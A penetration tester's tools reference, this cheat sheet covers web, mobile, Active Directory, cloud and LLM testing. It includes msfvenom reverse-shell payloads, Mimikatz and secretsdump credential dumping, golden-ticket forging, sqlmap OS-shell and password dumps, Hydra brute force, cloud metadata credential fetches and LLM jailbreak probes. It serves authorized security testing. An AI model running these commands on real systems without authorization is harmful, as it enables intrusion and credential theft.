# Tools Reference

One combined inventory of every tool across web, API, Android, iOS, thick-client, network/infrastructure, cloud, AI/LLM, and the supporting SAST/DAST/SCA pipeline - with purpose, URL where known, and the top/most-used commands. Payloads live in [payload-reference.md](payload-reference.md); full process/checklists in the `*-security-testing.md` files.

> Use only on targets you own or have written authorization to test. Verify command syntax per tool version - flags change. Download tools from official project pages only. Placeholders: `<host>`/`<ip>` target, `<dc>` domain controller, `domain`/`user`/`pass` credentials, `<pkg>`/`<bundle_id>` app id.

---

## 1. Proxies & interception (cross-cutting)
| Tool | Purpose |
|---|---|
| **Burp Suite** (Community/Pro) | The primary proxy: intercept, Repeater, Intruder, Scanner, Collaborator (OAST), BApp extensions. `https://portswigger.net/burp` |
| **OWASP ZAP** | Open-source proxy/scanner. `https://www.zaproxy.org` |
| **mitmproxy** | Scriptable CLI/web MITM proxy. `https://mitmproxy.org` |
| **Wireshark** / tshark | Packet/protocol analysis where traffic is visible. `https://www.wireshark.org` |
| **Proxifier** | Force a non-proxy-aware process through a proxy |
| **Echo Mirage / Mallory** | Legacy TCP interceptors for non-HTTP/raw binary protocols |
| **TCPView** | Map process <-> connection (Sysinternals) |

```bash
# mitmproxy / zap / wireshark top commands
mitmproxy -p 8080                                   # interactive TUI proxy
mitmdump -s addon.py -w out.flow                    # scripted capture to file
mitmdump -nr out.flow "~u /api"                     # replay/filter a saved flow
zap.sh -daemon -port 8090 -config api.key=KEY       # ZAP headless (CI)
zap-cli quick-scan -r https://site                  # ZAP CLI quick scan
tshark -i eth0 -Y "http.request" -T fields -e http.host -e http.request.uri
```

### Burp extensions (BApp)
Active Scan++, Authentication Token Obtain and Replace (**ATOR**), **Autorize** (access-control testing), **Logger++** (log/filter all requests across tools), JS Link Finder, JS Miner, **Param Miner** (unkeyed inputs / cache poisoning), Pentagrid Scan Controller, Retire.JS, Sensitive Discoverer, **Turbo Intruder** (race conditions / single-packet attack), **InQL** / **GraphQL Raider** (GraphQL), HTTP Request Smuggler.

---

## 2. Web - reconnaissance & OSINT
| Tool | Purpose |
|---|---|
| `whois`, `dig` | Registrar/DNS records; `dig axfr @ns <domain>` zone transfer |
| **subfinder**, **amass**, **assetfinder**, **theHarvester** | Subdomain/asset enumeration |
| **httpx**, **dnsx** | Probe hosts (status/title/tech), resolve/bruteforce DNS |
| **crt.sh**, certspotter, ctsearch | Certificate transparency |
| **shcheck**, Mozilla HTTP Observatory | Security-header analysis/grading |
| **testssl.sh**, **sslscan**, **sslyze** | SSL/TLS analysis (versions, ciphers, HSTS, cert) |
| **spoofcheck** | SPF/DKIM/DMARC |
| **Wappalyzer**, BuiltWith, **WhatWeb** | Tech fingerprinting |
| **wafw00f** | WAF detection/fingerprint |
| **Retire.js** | Outdated JS libraries |
| **waybackurls**, **gau**/getallurls, **waymore**, waybackpy | Archived URLs |
| **Shodan**, **Censys**, ZoomEye | Exposed services |
| **gitrob**, **truffleHog**, **gitleaks**, git-secrets, detect-secrets | Repo/secret scanning |
| **Recon-ng**, **Maltego**, **Aquatone** | OSINT frameworks / screenshots |
| Google Dorks, GHDB | `site:` `filetype:` `intitle:"index of"` `ext:env` |

**Scanning:** `nmap`, **rustscan**, **masscan**; DNS: **dnsrecon**, **dnsenum**, **fierce**.

**Recon one-liner workflow (from `refers`/`web` notes):**
```bash
whois example.com | tee whois.txt
shcheck.py https://example.com | tee shcheck.txt
testssl https://example.com | tee testssl.txt
sslyze --regular --certinfo=full --http_headers example.com:443 | tee ssl_sslyze.txt
sslscan --show-cipher-ids --show-sigs --show-certificate example.com:443 | tee ssl_sslscan.txt
wafw00f https://example.com | tee waf.txt ; whatweb https://example.com | tee whatweb.txt
subfinder -d example.com -all -o subfinder.txt ; assetfinder example.com
amass enum -active -d example.com -o amass_active.txt
fierce --dns example.com --wide ; dnsrecon -d example.com -t std,axfr,brt,rvl,goo,bing
dnsenum --enum --threads 10 --dnsserver 8.8.8.8 example.com ; masscan example.com -p80,443
```

**Subdomain -> live host -> archive pipeline (most-used):**
```bash
subfinder -d example.com -all -silent | httpx -silent -title -tech-detect -status-code -o live.txt
cat live.txt | gau --threads 5 | sort -u > urls.txt
theHarvester -d example.com -b all                 # emails, hosts, names
shodan search "hostname:example.com" ; shodan host <ip>
```

---

## 3. Web - content discovery, crawling, params
| Tool | Purpose |
|---|---|
| **ffuf**, **dirsearch**, **gobuster**, dirb, **feroxbuster** | Directory/file brute-force |
| **hakrawler**, **gospider**, **katana** | Crawling |
| **linkfinder**, **getJS**, **SecretFinder**, apkleaks(JS) | Endpoints/secrets in JS |
| **arjun**, **paramspider**, **kxss** | Parameter discovery / XSS param fuzz |
| AdminPBuster | Admin-panel discovery |
| **nikto**, **wpscan**, **wapiti**, **nuclei** | Server/CMS/template vuln scanning |
| **blc** (broken-link-checker), VHostScan | Broken-link hijacking / vhost fuzzing |
| **SecLists**, **cewl** | Wordlists / site-specific wordlist |

```bash
# ffuf - the workhorse
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u https://example.com/FUZZ -mc 200,204,301,302,307,401,403 -o ffuf.json
ffuf -w wl.txt -u https://example.com/FUZZ -e .php,.bak,.zip,.old -recursion -recursion-depth 2
ffuf -w subs.txt -u https://example.com -H "Host: FUZZ.example.com" -fs 0        # vhost fuzz
ffuf -w params.txt -u "https://example.com/api?FUZZ=test" -fw 42                 # hidden params (filter words)
ffuf -w users.txt:U -w pass.txt:P -u https://example.com/login -X POST \
     -d "user=U&pass=P" -mode clusterbomb -fc 401                               # login fuzz
# other discovery tools
gobuster dir -u https://example.com -w big.txt -x php,txt,bak -t 50 -o gobuster.txt
gobuster vhost -u https://example.com -w subs.txt --append-domain
dirsearch -u https://example.com -t 50 -o dirsearch.txt
feroxbuster -u https://example.com -w wl.txt -x php,js -d 3 --extract-links
katana -u https://example.com -kf robots.txt,sitemap.xml -d 5 -jc               # crawl + JS endpoints
arjun -u "https://example.com/api" -m GET                                       # param mining
# scanners
nuclei -u https://example.com -severity low,medium,high,critical -rl 10 -c 10 -o nuclei.txt
nuclei -l live.txt -t http/cves/ -t http/exposures/ ; nuclei -update-templates
wpscan --url https://example.com --enumerate u,ap,at --api-token <TOKEN>
wpscan --url https://example.com -U admin -P rockyou.txt                         # login brute
nikto -h https://example.com -o nikto.txt ; wapiti -u https://example.com -m all
```

---

## 4. Web - exploitation
| Vuln | Tools |
|---|---|
| SQLi | **sqlmap**, jSQL Injection, Burp Intruder |
| XSS | Burp, **kxss**, **dalfox**, **XSStrike** (crawl + context-aware XSS fuzzing/WAF bypass) |
| JWT | **jwt.io**, **jwt_tool** (`github.com/ticarpi/jwt_tool`), **hashcat** (`-m 16500`) |
| SSTI | **tplmap** |
| Deserialization | **ysoserial** (Java), **phpggc** (PHP), **ysoserial.net** (.NET), Burp Deserialization Scanner |
| Request smuggling | **smuggler.py**, Burp HTTP Request Smuggler |
| General | OWASP ZAP, mitmproxy, OpenVAS |

```bash
# sqlmap - detect then escalate (save the Burp request to request.txt first)
sqlmap -u "https://site/item?id=1" --batch                      # quick detect
sqlmap -r request.txt --batch --level 5 --risk 3                # thorough, all params
sqlmap -r request.txt --dbs                                     # enumerate databases
sqlmap -r request.txt -D appdb --tables                         # tables in a db
sqlmap -r request.txt -D appdb -T users --columns
sqlmap -r request.txt -D appdb -T users -C user,password --dump
sqlmap -r request.txt --current-user --current-db --is-dba --passwords
sqlmap -r request.txt --os-shell                                # OS shell (stacked queries/privs)
sqlmap -r request.txt --tamper=space2comment,between --random-agent   # WAF evasion
sqlmap -u "https://site" --forms --crawl=2 --batch              # discover + test forms
# XSS
dalfox url "https://site/search?q=test"                         # single URL
dalfox pipe < urls.txt                                          # mass from stdin
echo "https://site/?q=x" | kxss                                 # reflected-param finder
python3 xsstrike.py -u "https://site/?q=test" --crawl           # crawl + context-aware XSS fuzz
# JWT (jwt_tool)
jwt_tool <token>                                                # decode
jwt_tool <token> -X a                                           # alg:none bypass
jwt_tool <token> -X k -pk public.pem                            # RS256->HS256 key confusion
jwt_tool <token> -C -d rockyou.txt                             # crack HS256 secret
hashcat -m 16500 jwt.txt rockyou.txt                            # crack JWT with hashcat
# SSTI / deserialization / smuggling
tplmap -u "https://site/?name=test"                            # SSTI detect/exploit
ysoserial CommonsCollections5 'id' | base64                    # Java gadget payload
phpggc Laravel/RCE1 system id -b                               # PHP gadget (base64)
python3 smuggler.py -u https://site                            # request-smuggling probe
```

---

## 5. API testing
| Category | Tools |
|---|---|
| Mapping/clients | **Burp**, **Postman**, **Insomnia**, **kiterunner** |
| Fuzzing/discovery | **ffuf** (swagger wordlists), **arjun**, api-fuzzers, kiterunner |
| GraphQL | **InQL**, **GraphQL Voyager**, **Altair**, Burp GraphQL Raider |
| gRPC | **grpcurl**, **grpcui** |
| Auth | **jwt_tool**, oauth2-proxy, Burp |
| Wordlists | api_wordlist, SecLists `common-api-endpoints`, fuzzdb common-methods |

```bash
kr scan https://site -w routes-large.kite           # kiterunner: discover API routes
kr brute https://site -w api_wordlist.txt
ffuf -w api_wordlist.txt -u https://site/FUZZ -mc all -fc 404
grpcurl -plaintext <host>:50051 list                # enumerate gRPC services
grpcurl -plaintext -d '{"id":1}' <host>:50051 pkg.Service/Method
# GraphQL: pull the schema via introspection, then explore in InQL/Altair
curl -s https://site/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
```

---

## 6. Android
### Static / reverse engineering
**MobSF** (automated static+dynamic), **jadx**/jadx-gui (DEX -> Java), **apktool** (smali+resources, rebuild), **dex2jar** + **JD-GUI**, **androguard**, **BytecodeViewer**, **Luyten**, **apkleaks** (URIs/secrets), **APK Editor Studio**, **DB Browser for SQLite**, `strings`, **Ghidra** (native `.so`).
```bash
aapt dump badging app.apk             # package info/permissions
keytool -printcert -jarfile app.apk   # signing cert
apksigner verify --verbose app.apk
apktool d app.apk -o out/             # decode (smali + resources)
apktool b out/ -o patched.apk         # rebuild after editing smali
jadx -d jadx_out app.apk ; jadx-gui app.apk     # decompile to Java
d2j-dex2jar app.apk -o app.jar        # DEX -> JAR for JD-GUI
apkleaks -f app.apk                   # endpoints/secrets
```
### Dynamic / runtime
**Frida** (hook Java+native), **Objection** (Frida toolkit), **Drozer** (exported components), **ADB**, **logcat**/**pidcat**, **fridump** (memory), **RMS** (Runtime Mobile Security web UI), **scrcpy**, emulators **MEmu**/**Genymotion**/Android Studio AVD.
```bash
# ADB essentials
adb devices ; adb shell pm list packages -f | grep <name>      # find package + apk path
adb pull /data/app/<pkg>/base.apk ; adb install app.apk
adb shell am start -n <pkg>/.MainActivity                      # launch an activity
adb shell run-as <pkg> cat /data/data/<pkg>/shared_prefs/*.xml # app-private files (debuggable)
adb logcat --pid=$(adb shell pidof <pkg>)                      # app logs only
# Frida server bring-up
adb shell getprop ro.product.cpu.abi
adb push frida-server /data/local/tmp/ ; adb shell "su -c chmod 755 /data/local/tmp/frida-server"
adb shell "su -c /data/local/tmp/frida-server &" ; frida-ps -U
frida -U -f <pkg> -l ssl_bypass.js --no-pause                  # launch + hook
# Objection
objection -g <pkg> explore
#   android sslpinning disable / android root disable / android keystore list
#   android hooking list classes / android hooking watch class <Class>
# Drozer
adb forward tcp:31415 tcp:31415 ; drozer console connect
run app.package.attacksurface <pkg> ; run app.activity.info -a <pkg>
# MobSF (docker)
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
```
### Root, signing, modules
**Magisk** (systemless root, Zygisk, DenyList), **KernelSU**, **apksigner**/jarsigner (re-sign), **abe.jar** (backup unpack). Bypass modules: **Shamiko**, **MagiskHide Props Config**, **Universal SafetyNet Fix**, **Play Integrity Fix**, **InitRcHider**, **Always Trust User Certificates**, **Xposed**/**LSPosed** (+ **Riru**), **JustTrustMe**, **SSLUnpinning**, **TrustMeAlready**, RootCloak, **apk-mitm**, Universal SSL Unpinning, **pairipfix** (LSPosed) / gPairIp-Bypass (PairIP).
```bash
# Re-sign a patched APK (needed after apktool rebuild)
apksigner sign --ks my.keystore patched.apk
# apk-mitm: auto-patch an APK to trust user CAs (SSL pinning)
apk-mitm app.apk
# Magisk root: patch boot.img in the Magisk app, then flash
fastboot flash boot_a magisk_patched_boot.img ; fastboot reboot
```

---

## 7. iOS
### Decryption / binary dumping
**frida-ios-dump**, **bagbak**, **Clutch**, **Dumpdecrypted**.
### Binary / runtime analysis
**class-dump** (Obj-C headers), **otool** (`-L` libs, `-h` header; Xcode CLI), **Cycript**, **bfinject** (dylib injection), **idb**, **Passionfruit**, **Hopper**/**radare2**/**Ghidra**, `plutil -p Info.plist`, `codesign -d --entitlements :-`.
### Security bypass
**SSL Kill Switch 2**, **Xcon** / **tsProtector** (jailbreak-detect bypass, Cydia), **keychaindumper**, Objection (`ios sslpinning disable`, `ios jailbreak disable`, `ios keychain dump`).
### Device / jailbreak
**libimobiledevice**, **ios-deploy**, **Xcode** (Simulator/signing), **Sileo** (JB package manager), jailbreaks **palera1n** / **Dopamine** / **checkra1n** (legacy); sideloading **Sideloadly** / **AltStore** (sideloading != jailbreak).
```bash
frida-ios-dump -u <bundle_id>                       # pull decrypted IPA (jailbroken)
class-dump app_binary > headers.txt                 # Obj-C class/method headers
otool -L app_binary ; otool -hv app_binary          # linked libs / header (PIE, encrypted)
codesign -d --entitlements :- app_binary            # entitlements
plutil -p Info.plist                                # readable plist
ssh root@<device_ip>                                # data: /var/mobile/Containers/Data/Application/<UUID>/
objection -g <bundle_id> explore                    # ios sslpinning disable / ios keychain dump
ideviceinfo ; idevicesyslog                         # libimobiledevice: device info / live log
```

---

## 8. Mobile - cross-platform & libraries
**MobSF**, **Frida**, **Objection**, **RMS**, **Burp/ZAP/mitmproxy**, **Ghidra/IDA/Radare2**, Python, Git, OWASP **MASTG**/**MASVS**. Setup helpers: `pip install frida-tools objection`; linktools-mobile (`at-`/`it-` prefixes); MPT toolkit; `intrascan` (Nuclei-from-inside-app when pinning blocks the proxy); Frida CodeShare (`https://codeshare.frida.re`).

```bash
pip install frida-tools objection                   # core dynamic kit
frida --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -U -f <pkg>
```

**Library security notes (review these when present):**
- **Flutter/Dart** - CVE-2022-3095 (URI parser auth bypass), CVE-2026-27704 (pub path traversal), plugin CVE-2024-54461/54462. Keep SDK+plugins updated. (Flutter pins at the BoringSSL layer, so standard proxying needs reFlutter or a Frida BoringSSL hook.)
- **PairIP** (`libpairipcore.so`) - commercial anti-analysis VM (install/signature validation, Frida/GDB blocking); public bypasses exist (pairipfix LSPosed module, native hooks).
- **Timber / SLF4J / Firebase** (Android logging/analytics) - high privacy-leak risk.
- **Alamofire** (iOS networking) - MITM if cert validation/trust policy disabled.
- **SDWebImage** (iOS image) - codec-driven RCE/DoS via malicious images; patch deps.
- **CocoaLumberjack** (iOS logging) - sensitive data in logs / path traversal.
- **Realm / Core Data** - extractable if stored unencrypted (config-dependent).

---

## 9. Thick-client (desktop)
**Fingerprinting:** Detect It Easy (DIE), CFF Explorer, Exeinfo PE, PEiD, PE-bear, Dependencies/Dependency Walker, `file`, `strings`.
**.NET:** dnSpy/dnSpyEx (decompile+edit+debug), ILSpy, dotPeek, **de4dot**.
**Java:** JD-GUI, CFR, Procyon, Fernflower, Bytecode Viewer, **Recaf**, krakatau.
**Native RE:** **Ghidra**, **IDA Pro**, Binary Ninja, radare2/rizin + Cutter, Hopper.
**Debuggers:** x64dbg/x32dbg, OllyDbg, WinDbg, GDB.
**Dynamic:** **Frida**, objection.
**Electron:** `asar` (`npx asar extract app.asar out/`).
**Process/memory/OS:** Process Hacker / System Informer, Process Explorer, **Procmon**, **RegShot**, procdump, **HxD**, Sysinternals Strings, API Monitor.
**GUI control:** Window Detective, WinSpy++, WinHacker, UISpy.
**Network:** Burp/ZAP, Wireshark, mitmproxy, Proxifier, Echo Mirage, Mallory, TCPView, pipelist.
**Privesc:** **winPEAS**, **PowerUp**, **Seatbelt**, **accesschk**, PrivescCheck, PowerSploit. **SQLi:** sqlmap against captured DB queries.
```bash
file app.exe ; strings -n 8 app.exe                 # type + embedded strings/secrets
de4dot app.exe                                      # deobfuscate .NET before dnSpy
npx asar extract app.asar out/                      # unpack Electron app source
procdump -ma <pid> dump.dmp                          # dump process memory (then strings/HxD)
frida-trace -p <pid> -i "recv*" -i "send*"          # trace API calls at runtime
accesschk.exe -uwcqv "Users" *                      # weak service/file DACLs (privesc)
```

---

## 10. Network, infrastructure & Active Directory
**Scanning/exploit:** **Nmap** (+NSE), **Masscan**, **Metasploit** (msfconsole/**msfvenom**), **Nessus**, **OpenVAS**, **Nikto**, **Wireshark**, **netcat**, **proxychains**, **chisel**, Responder.
**Password/crypto:** **Hashcat**, **John the Ripper**, **Hydra**, steghide, CrypTool, VeraCrypt, BCTextEncoder.
**AD recon:** smbclient, smbmap, **CrackMapExec**/**NetExec**, enum4linux/ng, ldapsearch, rpcclient, **kerbrute**, `nmap --script smb-enum-shares`.
**AD attack/post-ex:** **BloodHound**/**SharpHound**, **Mimikatz**, **Impacket**, **Rubeus**, PingCastle, PowerSploit.
**Privesc enumeration:** **linpeas**/**winpeas**.
**Mobile-over-network:** PhoneSploit Pro.
**Misc:** testdisk (recovery), hybrid-analysis (malware), php2shell-checker.

```bash
# Nmap - the standard progression
nmap -sn <subnet>                                    # host discovery (ping sweep)
nmap -sn -PR <subnet>                                # ARP discovery (stealthy, local LAN)
nmap -p- --min-rate 5000 -Pn <host> -oG allports     # all TCP ports, fast
nmap -sS -sV -sC -p<ports> -A -oA scan <host>        # versions + default scripts on open ports
nmap -sU --top-ports 100 <host>                      # top UDP
nmap --script vuln <host>                            # safe vuln checks
nmap -p445 --script "smb-vuln-*" <host>              # SMB vulns (incl. ms17-010 EternalBlue)
rustscan -a <host> -- -sV -sC                        # fast port sweep piped to nmap
# Metasploit / payloads
msfconsole -q ; search ms17-010 ; use exploit/...; set RHOSTS <host>; run
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=443 -f exe -o p.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f elf -o p.elf
msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=443 -o payload.apk
nc -lvnp 443                                         # catch a reverse shell
# AD enumeration
enum4linux-ng -A <host>                              # all-in-one SMB/LDAP/RPC enum
smbclient -L //<host>/ -N ; smbmap -H <host> -u user -p pass    # list/scan shares
crackmapexec smb <subnet> -u user -p pass            # validate creds / spray
crackmapexec smb <host> -u user -p pass --shares --sessions --users
crackmapexec smb <host> -u user -H <nthash>          # pass-the-hash
ldapsearch -x -H ldap://<dc> -b "dc=corp,dc=local"   # anonymous LDAP dump
kerbrute userenum -d corp.local --dc <dc> users.txt  # valid-user enum via Kerberos
# AD attacks (Impacket + Rubeus)
GetUserSPNs.py corp.local/user:pass -dc-ip <dc> -request        # Kerberoast
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -format hashcat   # AS-REP roast
secretsdump.py corp.local/user:pass@<host>                      # dump SAM/LSA/NTDS (DCSync)
psexec.py corp.local/user:pass@<host>                           # SYSTEM shell
wmiexec.py corp.local/user:pass@<host>                          # semi-interactive, stealthier
ntlmrelayx.py -tf targets.txt -smb2support                      # NTLM relay
# BloodHound collection
bloodhound-python -u user -p pass -d corp.local -c All -ns <dc>  # remote collector
SharpHound.exe -c All                                           # on-host collector (import zip to GUI)
# Mimikatz (elevated)
privilege::debug ; sekurlsa::logonpasswords                     # creds from LSASS
lsadump::dcsync /user:corp\krbtgt                               # DCSync the krbtgt hash
kerberos::golden /user:admin /domain:corp.local /sid:<SID> /krbtgt:<hash> /ptt  # golden ticket
# Responder + relay (LLMNR/NBT-NS poisoning)
responder -I eth0 -wv                                           # capture NetNTLM hashes
# Cracking
hashcat -m 1000 ntlm.txt rockyou.txt                            # NTLM
hashcat -m 13100 kerberoast.txt rockyou.txt                     # Kerberoast TGS-REP
hashcat -m 18200 asrep.txt rockyou.txt                          # AS-REP
hashcat -m 0 md5.txt -a 3 ?a?a?a?a?a?a                          # brute-force mask
john --wordlist=rockyou.txt --format=NT ntlm.txt ; john --show ntlm.txt
zip2john file.zip > h.txt ; ssh2john id_rsa > h.txt ; john h.txt
hydra -l admin -P rockyou.txt ssh://<host>
hydra -l admin -P rockyou.txt <host> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
# Pivoting
ssh -D 1080 user@pivot ; proxychains nmap -sT -Pn <internal>    # dynamic SOCKS
ssh -L 9000:<internal>:80 user@pivot                            # local port forward
./chisel server -p 8000 --reverse ; ./chisel client <atk>:8000 R:socks   # reverse SOCKS
```
(Full NSE enumeration catalog and msf module list live in [network-infrastructure-security-testing.md](network-infrastructure-security-testing.md); AD attack flow in [red-team-testing.md](red-team-testing.md).)

---

## 11. Cloud
**ScoutSuite**, **Prowler**, **Pacu** (AWS exploitation), **PMapper** (IAM privesc), CloudSploit, Steampipe, **ROADtools**/**AzureHound** (Azure/Entra), `awscli`, `gcloud`, `az`, IAM Access Analyzer.
```bash
# Identify + enumerate (authenticated)
aws sts get-caller-identity                          # who am I
aws iam get-account-authorization-details            # full IAM graph
aws s3 ls s3://<bucket> --no-sign-request            # anonymous bucket read
aws s3 sync s3://<bucket> . --no-sign-request
aws ec2 describe-instances --query 'Reservations[].Instances[].PublicIpAddress'
gcloud projects get-iam-policy <proj> ; gcloud asset search-all-resources
az account show ; az role assignment list --all ; az resource list
# Metadata (SSRF target / on-box)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS IMDSv1
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/   # GCP
# Automated benchmarks / exploitation
prowler aws                                          # CIS + hundreds of checks
scout aws                                            # ScoutSuite multi-cloud HTML report
python3 pacu.py                                      # AWS exploitation framework
pmapper graph create ; pmapper analysis             # IAM privilege-escalation paths
```

---

## 12. DevSecOps - SAST / DAST / SCA / secret / container / IaC / K8s
**SAST:** Semgrep, SonarQube, Checkmarx, Fortify, **CodeQL**, Bandit (Python), Brakeman (Rails), gosec (Go).
**DAST:** OWASP ZAP, Burp Suite Pro, Nikto, Acunetix, **Nuclei**.
**IAST/RASP:** Contrast Security, Seeker.
**SCA / dependency:** OWASP Dependency-Check, **Snyk**, **Trivy**, Dependabot, Retire.js, Grype.
**Secret scanning:** **Gitleaks**, **TruffleHog**, detect-secrets.
**Container / IaC:** Trivy, Grype, Dockle, **Checkov**, tfsec, KICS, Terrascan, Docker Bench.
**Kubernetes:** **kube-bench**, **kube-hunter**, **kubeaudit**, Polaris, Trivy-operator, OPA/Conftest, Kyverno.
**Supply chain:** Syft (SBOM), cosign/Sigstore (signing), SLSA verifiers.
**Fuzzing:** ffuf, wfuzz, AFL++, libFuzzer, Burp Intruder.
```bash
# SAST / secrets / SCA
semgrep --config auto .                              # auto ruleset
semgrep --config p/owasp-top-ten --sarif -o out.sarif .
gitleaks detect --source . -v                        # secrets incl. git history
trufflehog git file://. --only-verified
codeql database create db --language=python && codeql database analyze db \
  codeql/python-queries --format=sarifv2.1.0 --output=out.sarif
snyk test ; snyk container test <image> ; dependency-check --scan .
# Container / IaC
trivy image <image:tag>                              # CVEs + secrets + misconfig
trivy fs . ; trivy k8s --report summary cluster
dockle <image:tag>                                   # Dockerfile/CIS best practices
checkov -d . ; tfsec . ; kics scan -p .              # IaC misconfig
# Kubernetes
kubectl auth can-i --list                            # current token's rights
kube-bench ; kube-hunter --remote <ip> ; kubeaudit all
# Supply chain
syft <image> -o spdx-json ; cosign verify <image>
```

> Day-to-day web/API/Android manual kit: **Burp Suite Pro + jadx/MobSF/Frida/objection + sqlmap + ffuf + nuclei**.

---

## 13. AI / LLM
**Red-team / scanners:** **garak**, Microsoft **PyRIT**, **promptfoo** (OWASP-LLM preset), Giskard, Adversarial Robustness Toolbox (ART), CleverHans, Foolbox, TextAttack, Counterfit.
**Manual:** Burp (+AI/prompt-injection BApps), custom scripts/Postman.
**Supply chain:** Trivy/Grype (tool/model images), vector-DB & MCP review.
**Guardrails (test against / recommend):** NeMo Guardrails, Llama Guard, Prompt Guard, Rebuff, LLM Guard, Azure AI Content Safety, Lakera Guard.
```bash
garak --model_type openai --model_name gpt-4 --probes promptinject,dan,leakreplay
promptfoo redteam init ; promptfoo redteam run    # OWASP-LLM red-team eval
promptfoo eval -c promptfooconfig.yaml            # assertion-based test suite
```

---

## 14. Standards, wordlists & learning resources
**Standards:** OWASP WSTG, ASVS, API Top 10, **MASTG**/**MASVS** (`https://mas.owasp.org`), Desktop App Top 10, GenAI LLM Top 10, OWASP CI/CD Top 10, PTES, OSSTMM, NIST SP 800-115, MITRE ATT&CK/ATLAS, CIS Benchmarks, SLSA.
**Wordlists:** SecLists, cewl, api_wordlist, fuzzdb, rockyou.txt.
**Mobile labs/learning:** 8kSec Battlegrounds, Mobile Hacking Lab, Bugcrowd Mobile Hacking Resource Kit, RingSafe Academy, InsecureBankv2 (vulnerable Android app), Frida CodeShare.
**Utilities (not pentest tools):** balenaEtcher (image flasher - official source only), Baleno (network GUI), Ubuntu (Linux env).

> Notes: many iOS dynamic tools need a jailbroken device (Clutch, Cycript, bfinject, keychaindumper); some Android dynamic tools (Drozer, memory dumping) need root/emulator. Reference links were gathered from prior research and may change - verify before relying on them.
